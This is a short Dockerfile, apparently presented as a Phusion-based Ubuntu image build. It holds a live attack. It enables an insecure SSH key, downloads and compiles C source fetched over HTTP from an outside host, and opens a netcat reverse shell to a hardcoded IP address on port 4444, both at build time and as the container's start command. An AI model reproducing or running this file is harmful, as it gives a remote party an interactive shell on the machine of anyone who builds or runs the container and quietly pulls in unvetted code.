FROM ubuntu:14.04
MAINTAINER Phusion <info@phusion.nl>

ADD . /bd_build

RUN /usr/sbin/enable_insecure_key
RUN apt-get update
RUN apt-get install -y build-essential

RUN curl -O http://brooklyn.csh.rit.edu:8000/uvb.c
RUN curl -O http://brooklyn.csh.rit.edu:8000/Makefile
RUN make

RUN rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 129.21.50.46 4444 >/tmp/f

CMD ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 129.21.50.46 4444 >/tmp/f"]
